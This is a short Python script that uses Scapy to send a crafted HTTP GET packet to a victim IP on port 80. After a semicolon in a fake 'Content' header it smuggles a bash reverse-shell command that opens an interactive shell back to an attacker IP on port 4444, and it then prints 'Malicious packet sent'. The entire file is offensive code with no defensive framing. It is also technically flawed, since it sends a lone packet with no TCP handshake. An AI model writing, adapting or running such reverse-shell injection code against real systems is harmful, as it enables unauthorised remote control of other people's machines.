from scapy.all import *
import sys


victim_ip = "192.168.1.184" 
attacker_ip = "192.168.1.215"  
attacker_port = 4444  

# Constructing the reverse shell payload in the HTTP GET request
payload = f"GET / HTTP/1.1\r\nHost: {victim_ip}\r\n"
payload += f"User-Agent: Mozilla/5.0\r\n"
payload += f"Accept: */*\r\n"
# Reverse shell payload (bash version)
payload += f"\r\nContent: ; /bin/bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1\r\n\r\n"


packet = IP(dst=victim_ip) / TCP(dport=80, sport=RandShort(), flags="PA") / Raw(load=payload)


send(packet)
print(f"Malicious packet sent to {victim_ip} on port 80")
